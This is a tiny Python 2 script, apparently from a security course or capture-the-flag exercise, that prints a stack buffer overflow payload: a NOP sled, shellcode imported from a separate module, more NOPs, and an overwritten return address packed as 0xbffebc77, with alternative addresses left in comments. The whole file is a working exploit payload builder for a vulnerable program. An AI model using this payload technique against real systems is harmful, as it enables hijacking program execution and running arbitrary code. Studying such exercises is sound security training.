from struct import pack
from shellcode import shellcode
#print "\x90" * 1024
print "\x90" * 971 + shellcode + "\x90" * 12 + pack("<I",0xbffebc77)#bffec094)

#0x0804889a